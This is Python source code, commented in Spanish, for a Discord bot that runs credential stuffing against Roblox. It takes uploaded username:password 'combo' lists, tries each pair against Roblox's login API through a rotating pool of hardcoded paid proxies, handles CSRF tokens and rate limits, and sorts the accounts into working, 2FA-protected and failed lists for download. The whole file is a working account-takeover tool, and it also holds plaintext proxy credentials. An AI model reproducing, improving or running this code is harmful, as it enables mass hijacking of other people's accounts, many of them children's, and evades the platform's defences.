#!/usr/bin/env python3
"""
Roblox Checker Bot
Comando: /rbx-checker  (file)
Variables: DISCORD_TOKEN, CONCURRENCY (opcional), TIMEOUT (opcional)
"""

import asyncio
import io
import os
import random
import re
import time
from collections import deque
from datetime import datetime, timezone
from email.utils import parsedate_to_datetime

import aiohttp
import discord
from discord import app_commands
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN", "").strip()
CONCURRENCY = max(1, int(os.getenv("CONCURRENCY", "20")))
TIMEOUT = float(os.getenv("TIMEOUT", "20"))
MAX_COMBOS = 50_000
MAX_FILE = 8 * 1024 * 1024
MAX_RETRY_AFTER = 90.0
EDIT_EVERY = 1.5

LOGIN_URL = "https://auth.roblox.com/v2/login"
UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
)
BASE_HEADERS = {
    "User-Agent": UA,
    "Content-Type": "application/json",
    "Accept": "application/json",
    "Origin": "https://www.roblox.com",
    "Referer": "https://www.roblox.com/",
}

RAW_PROXIES = """
31.59.20.176:6754:qgvnbvdj:y9o46xt75m0k
45.38.107.97:6014:qgvnbvdj:y9o46xt75m0k
64.137.96.74:6641:qgvnbvdj:y9o46xt75m0k
198.23.243.226:6361:qgvnbvdj:y9o46xt75m0k
38.154.185.97:6370:qgvnbvdj:y9o46xt75m0k
84.247.60.125:6095:qgvnbvdj:y9o46xt75m0k
142.111.67.146:5611:qgvnbvdj:y9o46xt75m0k
191.96.254.138:6185:qgvnbvdj:y9o46xt75m0k
31.58.9.4:6077:qgvnbvdj:y9o46xt75m0k
198.46.161.42:5092:qgvnbvdj:y9o46xt75m0k
"""


def _parse_proxies(raw: str) -> list[str]:
    out = []
    for line in raw.strip().splitlines():
        line = line.strip()
        if not line:
            continue
        parts = line.split(":")
        if len(parts) == 4:
            host, port, user, pw = parts
            out.append(f"http://{user}:{pw}@{host}:{port}")
        elif len(parts) == 2:
            out.append(f"http://{parts[0]}:{parts[1]}")
    return out


PROXIES = _parse_proxies(RAW_PROXIES)
_proxy_i = 0
COOLDOWN_UNTIL = 0.0


def next_proxy() -> str | None:
    global _proxy_i
    if not PROXIES:
        return None
    _proxy_i = (_proxy_i + 1) % len(PROXIES)
    return PROXIES[_proxy_i]


async def wait_cooldown():
    while True:
        left = COOLDOWN_UNTIL - time.monotonic()
        if left <= 0:
            return
        await asyncio.sleep(min(left, 1.5))


def retry_delay(r: aiohttp.ClientResponse) -> float:
    """Tiempo que Roblox pide esperar, en segundos."""
    for header in ("retry-after", "x-ratelimit-reset", "x-ratelimit-reset-seconds"):
        raw = r.headers.get(header)
        if not raw:
            continue
        try:
            return min(max(float(raw), 0.5), MAX_RETRY_AFTER)
        except ValueError:
            try:
                when = parsedate_to_datetime(raw)
                if when.tzinfo is None:
                    when = when.replace(tzinfo=timezone.utc)
                delta = (when - datetime.now(timezone.utc)).total_seconds()
                return min(max(delta, 0.5), MAX_RETRY_AFTER)
            except Exception:
                continue
    return 5.0


# ------------------------------------------------------------------ combos
USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,20}$")
EMAIL_RE = re.compile(r"^[^@\s]{1,64}@[^@\s]{1,190}\.[A-Za-z]{2,10}$")
PASSWORD_RE = re.compile(r"^\S{1,120}$")

LISTA_PREFIJO = re.compile(r"^(?:[-*•·>]+|\d{1,4}[.)])\s+")
BASURA = ("#", "//", "http://", "https://", "www.", "[", "{")


def _limpiar(linea: str) -> str:
    linea = linea.strip().lstrip("\ufeff")
    linea = LISTA_PREFIJO.sub("", linea)
    return linea.strip().strip("`\"'").strip()


def _separar(linea: str) -> tuple[str, str] | None:
    if ":" in linea:
        user, pw = linea.split(":", 1)
    elif "|" in linea:
        user, pw = linea.split("|", 1)
    elif ";" in linea:
        user, pw = linea.split(";", 1)
    elif linea.count(" ") == 1:
        user, pw = linea.split(" ", 1)
    else:
        return None
    return user.strip(), pw.strip()


def es_usuario(valor: str) -> bool:
    return bool(USERNAME_RE.match(valor) or EMAIL_RE.match(valor))


def parse_combos(texto: str) -> tuple[list[tuple[str, str]], int]:
    """Devuelve (combos_válidos, ignoradas). Nunca lanza."""
    vistos = set()
    validos: list[tuple[str, str]] = []
    ignoradas = 0

    for bruta in texto.splitlines():
        try:
            linea = _limpiar(bruta)
        except Exception:
            ignoradas += 1
            continue

        if not linea or linea.lower().startswith(BASURA):
            ignoradas += 1
            continue

        partes = _separar(linea)
        if not partes:
            ignoradas += 1
            continue

        user, pw = partes
        if not es_usuario(user) or not PASSWORD_RE.match(pw):
            ignoradas += 1
            continue

        clave = (user.lower(), pw)
        if clave in vistos:
            ignoradas += 1
            continue
        vistos.add(clave)

        validos.append((user, pw))
        if len(validos) >= MAX_COMBOS:
            break

    return validos, ignoradas


def build_file(lines: list[str], name: str) -> discord.File:
    buf = io.BytesIO(("\n".join(lines) + "\n").encode("utf-8"))
    return discord.File(buf, filename=name)


def barra(done: int, total: int, ancho: int = 16) -> str:
    if total <= 0:
        return "░" * ancho
    filled = min(ancho, int(ancho * done / total))
    return "█" * filled + "░" * (ancho - filled)


# ------------------------------------------------------------------ workers
class Worker:
    __slots__ = ("session", "csrf")

    def __init__(self):
        self.session = aiohttp.ClientSession(
            headers=BASE_HEADERS,
            timeout=aiohttp.ClientTimeout(total=TIMEOUT),
            connector=aiohttp.TCPConnector(ssl=False, limit=2),
            cookie_jar=aiohttp.CookieJar(unsafe=True),
        )
        self.csrf = None


class Pool:
    def __init__(self, size: int):
        self._q: asyncio.Queue[Worker] = asyncio.Queue()
        self._all = [Worker() for _ in range(size)]
        for w in self._all:
            self._q.put_nowait(w)

    async def acquire(self) -> Worker:
        return await self._q.get()

    def release(self, w: Worker):
        self._q.put_nowait(w)

    async def close(self):
        for w in self._all:
            await w.session.close()


async def check_one(w: Worker, user: str, pw: str) -> dict:
    """Devuelve {'status': valid|2fa|bad|error, ...}"""
    global COOLDOWN_UNTIL

    ctype = "Email" if "@" in user else "Username"
    payload = {"ctype": ctype, "cvalue": user, "password": pw}

    intentos = 0
    esperas_rl = 0

    while intentos < 3:
        await wait_cooldown()
        proxy = next_proxy()
        try:
            if not w.csrf:
                async with w.session.post(LOGIN_URL, json={}, proxy=proxy) as r:
                    w.csrf = r.headers.get("x-csrf-token")

            headers = {"x-csrf-token": w.csrf} if w.csrf else {}

            async with w.session.post(
                LOGIN_URL, json=payload, headers=headers, proxy=proxy
            ) as r:
                status = r.status

                if status == 200:
                    try:
                        data = await r.json(content_type=None)
                    except Exception:
                        data = {}
                    u = (data or {}).get("user") or {}
                    return {
                        "status": "valid",
                        "username": u.get("name") or user,
                        "display": u.get("displayName") or "",
                    }

                if status == 403:
                    new_csrf = r.headers.get("x-csrf-token")
                    if new_csrf:
                        w.csrf = new_csrf

                    ctype_h = (r.headers.get("rblx-challenge-type") or "").lower()
                    challenge = r.headers.get("rblx-challenge-id")
                    body = (await r.text()).lower()

                    if "twostep" in ctype_h or "twostep" in body or "two-step" in body:
                        return {"status": "2fa"}

                    if challenge or "captcha" in body or "challenge" in body:
                        return {"status": "bad", "note": "captcha"}

                    if intentos < 2:
                        intentos += 1
                        w.csrf = None
                        continue
                    return {"status": "bad", "note": "challenge"}

                if status in (400, 401):
                    return {"status": "bad"}

                if status in (429, 503) and status == 429:
                    esperas_rl += 1
                    if esperas_rl > 6:
                        return {"status": "error", "note": "rate limit"}
                    delay = retry_delay(r)
                    COOLDOWN_UNTIL = max(COOLDOWN_UNTIL, time.monotonic() + delay)
                    await asyncio.sleep(delay)
                    continue

                if status >= 500:
                    if intentos < 2:
                        intentos += 1
                        await asyncio.sleep(1.0 + intentos)
                        continue
                    return {"status": "error", "note": f"HTTP {status}"}

                return {"status": "error", "note": f"HTTP {status}"}

        except asyncio.TimeoutError:
            if intentos < 2:
                intentos += 1
                continue
            return {"status": "error", "note": "timeout"}
        except aiohttp.ClientError as e:
            if intentos < 2:
                intentos += 1
                continue
            return {"status": "error", "note": type(e).__name__}
        except Exception as e:
            return {"status": "error", "note": str(e)[:60]}

    return {"status": "error", "note": "sin respuesta"}


# ------------------------------------------------------------------ job
class Job:
    def __init__(
        self,
        owner: int,
        combos: list[tuple[str, str]],
        pool: Pool,
        ignoradas: int = 0,
    ):
        self.owner = owner
        self.pool = pool
        self.pending = deque(combos)
        self.total = len(combos)
        self.ignoradas = ignoradas
        self.checked = 0
        self.current = "-"
        self.inflight = 0
        self.good: list[str] = []
        self.twofa: list[str] = []
        self.bad: list[str] = []
        self.errors: list[str] = []
        self.paused = asyncio.Event()
        self.paused.set()
        self.stopped = False
        self.finished = False
        self.started = time.monotonic()
        self.message: discord.Message | None = None
        self.view: "JobView | None" = None
        self.workers: list[asyncio.Task] = []
        self._editor: asyncio.Task | None = None

    @property
    def done(self) -> int:
        return len(self.good) + len(self.twofa) + len(self.bad) + len(self.errors)

    async def _record(self, user: str, pw: str, res: dict):
        combo = f"{user}:{pw}"
        st = res["status"]
        if st == "valid":
            self.good.append(combo)
        elif st == "2fa":
            self.twofa.append(combo)
        elif st == "bad":
            self.bad.append(combo)
        else:
            self.errors.append(f"{combo}  # {res.get('note', 'error')}")
        self.checked += 1

    async def _worker(self):
        while True:
            await self.paused.wait()
            if self.stopped:
                return
            try:
                user, pw = self.pending.popleft()
            except IndexError:
                return
            self.current = f"{user}:{pw}"
            self.inflight += 1
            w = await self.pool.acquire()
            try:
                res = await check_one(w, user, pw)
            finally:
                self.pool.release(w)
                self.inflight -= 1
            await self._record(user, pw, res)

    async def run(self):
        await asyncio.gather(
            *(self._worker() for _ in range(min(CONCURRENCY, max(self.total, 1))))
        )
        if self.stopped:
            return
        if not self.pending:
            self.finished = True
            await self.refresh(final=True)

    def embed(self, final: bool = False) -> discord.Embed:
        pct = self.done * 100 // max(self.total, 1)
        e = discord.Embed(
            title="Roblox Checker",
            colour=0x2ECC71 if self.good else (0x95A5A6 if not final else 0xE74C3C),
        )
        e.add_field(name="Archivo", value=f"**{self.total:,}** combos", inline=True)
        e.add_field(name="Checkeados", value=f"**{self.done:,}** ({pct}%)", inline=True)
        e.add_field(
            name="Restantes", value=f"**{max(self.total - self.done, 0):,}**", inline=True
        )
        e.add_field(name="Progreso", value=f"`{barra(self.done, self.total)}`", inline=False)
        e.add_field(name="Buenas", value=f"`{len(self.good)}`", inline=True)
        e.add_field(name="2FA", value=f"`{len(self.twofa)}`", inline=True)
        e.add_field(name="Malas", value=f"`{len(self.bad) + len(self.errors)}`", inline=True)
        if self.ignoradas:
            e.add_field(
                name="Ignoradas",
                value=f"`{self.ignoradas:,}` líneas sin formato",
                inline=False,
            )
        e.add_field(
            name="Cuenta actual",
            value=f"```{(self.current or '-')[:80]}```",
            inline=False,
        )
        if self.finished:
            estado = "Terminado"
        elif self.stopped:
            estado = "Detenido"
        elif not self.paused.is_set():
            estado = "Pausado"
        else:
            estado = "Checkeando"
        e.set_footer(
            text=f"{estado} · {self.inflight} en vuelo · {CONCURRENCY} hilos · {len(PROXIES)} proxies"
        )
        return e

    async def refresh(self, final: bool = False):
        if not self.message:
            return
        try:
            await self.message.edit(embed=self.embed(final), view=self.view)
        except Exception:
            pass

    async def editor_loop(self):
        while not self.finished:
            await asyncio.sleep(EDIT_EVERY)
            await self.refresh()
            if self.stopped and self.inflight == 0:
                await self.refresh()


# ------------------------------------------------------------------ vista
class JobView(discord.ui.View):
    def __init__(self, job: Job):
        super().__init__(timeout=None)
        self.job = job

    async def _guard(self, it: discord.Interaction) -> bool:
        if it.user.id != self.job.owner:
            await it.response.send_message(
                "Este checkeo no lo iniciaste tú.", ephemeral=True
            )
            return False
        return True

    async def _send(self, it: discord.Interaction, lines: list[str], name: str, vacio: str):
        if not await self._guard(it):
            return
        if not lines:
            await it.response.send_message(vacio, ephemeral=True)
            return
        await it.response.send_message(file=build_file(lines, name), ephemeral=True)

    @discord.ui.button(
        label="Descargar buenas",
        style=discord.ButtonStyle.success,
        custom_id="rbx_good",
        row=0,
    )
    async def good(self, it: discord.Interaction, _):
        await self._send(it, self.job.good, "buenas.txt", "Todavía no hay cuentas buenas.")

    @discord.ui.button(
        label="Descargar 2FA",
        style=discord.ButtonStyle.primary,
        custom_id="rbx_2fa",
        row=0,
    )
    async def twofa(self, it: discord.Interaction, _):
        await self._send(it, self.job.twofa, "2fa.txt", "Todavía no hay cuentas con 2FA.")

    @discord.ui.button(
        label="Descargar malas",
        style=discord.ButtonStyle.danger,
        custom_id="rbx_bad",
        row=0,
    )
    async def bad(self, it: discord.Interaction, _):
        await self._send(
            it, self.job.bad + self.job.errors, "malas.txt", "Todavía no hay cuentas malas."
        )

    @discord.ui.button(
        label="Detener",
        style=discord.ButtonStyle.secondary,
        custom_id="rbx_stop",
        row=0,
    )
    async def stop(self, it: discord.Interaction, _):
        if not await self._guard(it):
            return
        if self.job.finished:
            await it.response.send_message("El checkeo ya terminó.", ephemeral=True)
            return
        if self.job.stopped:
            await it.response.send_message("Ya está detenido.", ephemeral=True)
            return
        self.job.stopped = True
        self.job.paused.set()
        await it.response.send_message(
            "Detenido. Usa **Seguir** para reanudar.", ephemeral=True
        )
        await self.job.refresh()

    @discord.ui.button(
        label="Seguir",
        style=discord.ButtonStyle.secondary,
        custom_id="rbx_resume",
        row=0,
    )
    async def resume(self, it: discord.Interaction, _):
        if not await self._guard(it):
            return
        if self.job.finished:
            await it.response.send_message("El checkeo ya terminó.", ephemeral=True)
            return
        if not self.job.stopped:
            await it.response.send_message("Ya está corriendo.", ephemeral=True)
            return
        self.job.stopped = False
        self.job.paused.set()
        vivos = [t for t in self.job.workers if not t.done()]
        if not vivos and self.job.pending:
            self.job.workers = [asyncio.create_task(self.job.run())]
        await it.response.send_message("Reanudado.", ephemeral=True)
        await self.job.refresh()


# ------------------------------------------------------------------ bot
intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
pool: Pool | None = None
ACTIVE: set[int] = set()


async def sync_guild(guild: discord.Guild):
    try:
        bot.tree.copy_global_to(guild=guild)
        await bot.tree.sync(guild=guild)
        print(f"Comandos cargados en {guild.name} ({guild.id})")
    except discord.HTTPException as e:
        print(f"No pude sincronizar en {guild.name}: {e}")


@bot.event
async def on_ready():
    global pool
    if pool is None:
        pool = Pool(CONCURRENCY)

    try:
        synced = await bot.tree.sync()
        print(f"Comandos globales sincronizados: {len(synced)}")
    except discord.HTTPException as e:
        print(f"Error en sync global: {e}")

    for guild in bot.guilds:
        await sync_guild(guild)
        await asyncio.sleep(1)

    print(
        f"Listo: {bot.user} | {len(bot.guilds)} servidores | "
        f"{len(PROXIES)} proxies | {CONCURRENCY} hilos"
    )


@bot.event
async def on_guild_join(guild: discord.Guild):
    await sync_guild(guild)


@bot.event
async def on_guild_remove(guild: discord.Guild):
    print(f"Salí de {guild.name} ({guild.id})")


@bot.tree.command(name="rbx-checker", description="Checkea combos de Roblox desde un archivo")
@app_commands.describe(file="Archivo .txt con un combo por línea (user:pass)")
async def rbx_checker(interaction: discord.Interaction, file: discord.Attachment):
    if interaction.user.id in ACTIVE:
        await interaction.response.send_message(
            "Ya tienes un checkeo en curso.", ephemeral=True
        )
        return

    if file.size > MAX_FILE:
        await interaction.response.send_message("El archivo pasa de 8 MB.", ephemeral=True)
        return

    await interaction.response.defer(thinking=True)

    try:
        raw = await file.read()
    except Exception as e:
        await interaction.edit_original_response(content=f"No pude leer el archivo: `{e}`")
        return

    combos, ignoradas = parse_combos(raw.decode("utf-8", errors="ignore"))
    if not combos:
        await interaction.edit_original_response(
            content=(
                f"El archivo no tiene combos válidos.\n"
                f"Se ignoraron **{ignoradas:,}** líneas. Formato esperado: `usuario:contraseña`."
            )
        )
        return

    ACTIVE.add(interaction.user.id)

    job = Job(interaction.user.id, combos, pool, ignoradas)
    job.view = JobView(job)
    job.workers = [asyncio.create_task(job.run())]

    await interaction.edit_original_response(embed=job.embed(), view=job.view)
    job.message = await interaction.original_response()
    job._editor = asyncio.create_task(job.editor_loop())

    async def cleanup():
        while not job.finished:
            await asyncio.sleep(2)
        ACTIVE.discard(job.owner)
        await asyncio.sleep(1800)
        try:
            await job.message.edit(view=None)
        except Exception:
            pass

    asyncio.create_task(cleanup())


@bot.event
async def on_close():
    if pool:
        await pool.close()


if __name__ == "__main__":
    if not TOKEN:
        raise SystemExit("Falta DISCORD_TOKEN")
    bot.run(TOKEN)
